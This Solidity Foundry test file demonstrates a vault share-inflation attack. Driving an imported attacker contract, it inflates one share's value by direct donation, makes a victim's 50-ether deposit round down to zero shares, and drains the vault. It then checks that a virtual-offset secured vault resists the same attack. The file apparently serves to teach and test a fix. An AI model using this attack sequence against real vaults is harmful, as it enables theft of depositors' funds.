// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "../vulnerable.sol";
import "../Exploit.sol";
import "../fixed.sol";

contract VaultInflationTest is Test {
    MockERC20 public token;
    VulnerableVault public vulnerableVault;
    SecuredVault public securedVault;
    Attacker public attackerContract;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20("Underlying Token", "TKN");
        vulnerableVault = new VulnerableVault(address(token));
        securedVault = new SecuredVault(address(token));

        vm.prank(attacker);
        attackerContract = new Attacker(address(vulnerableVault));

        // Fund attacker and victim
        token.mint(attacker, 100 ether + 1);
        token.mint(victim, 50 ether);
    }

    function test_shareInflationExploit() public {
        // --- 1. Attacker sets up share inflation ---
        vm.startPrank(attacker);
        token.transfer(address(attackerContract), 100 ether + 1);
        attackerContract.setupInflation(100 ether);
        vm.stopPrank();

        // 1 share now represents 100 ether + 1 wei of assets
        assertEq(vulnerableVault.totalSupply(), 1);
        assertEq(vulnerableVault.totalAssets(), 100 ether + 1);

        // --- 2. Victim deposits 50 ether ---
        vm.startPrank(victim);
        token.approve(address(vulnerableVault), 50 ether);
        uint256 victimShares = vulnerableVault.deposit(50 ether, victim);
        vm.stopPrank();

        // Integer division truncation: (50 ether * 1) / (100 ether + 1) = 0 shares!
        assertEq(victimShares, 0);
        assertEq(vulnerableVault.balanceOf(victim), 0);
        assertEq(token.balanceOf(victim), 0);

        console.log("Victim shares received:", victimShares);
        console.log("Vault total assets after victim deposit:", vulnerableVault.totalAssets());

        // --- 3. Attacker completes the drain ---
        vm.prank(attacker);
        attackerContract.completeDrain();

        // Attacker drained the victim's entire 50 ether!
        uint256 attackerFinalBalance = token.balanceOf(attacker);
        console.log("Attacker final token balance:", attackerFinalBalance);

        assertEq(attackerFinalBalance, 150 ether + 1);
        assertEq(vulnerableVault.totalAssets(), 0);
    }

    function test_securedVaultPreventsInflation() public {
        // --- 1. Attacker attempts to inflate SecuredVault ---
        vm.startPrank(attacker);
        token.approve(address(securedVault), 1);
        uint256 attackerShares = securedVault.deposit(1, attacker);

        // Virtual offset mints virtual-scaled shares even for 1 wei
        assertGt(attackerShares, 0);

        // Attacker donates 100 ether directly to vault
        token.transfer(address(securedVault), 100 ether);
        vm.stopPrank();

        // --- 2. Victim deposits 50 ether ---
        vm.startPrank(victim);
        token.approve(address(securedVault), 50 ether);
        uint256 victimShares = securedVault.deposit(50 ether, victim);

        // Victim receives valid shares proportional to their contribution
        assertGt(victimShares, 0);
        console.log("SecuredVault - Victim shares received:", victimShares);

        // Victim can redeem shares back for their fair share of assets
        uint256 victimWithdrawnAssets = securedVault.withdraw(victimShares, victim);
        assertGt(victimWithdrawnAssets, 49 ether); // Retains their assets without zero-share truncation
        console.log("SecuredVault - Victim redeemed assets:", victimWithdrawnAssets);
        vm.stopPrank();
    }
}
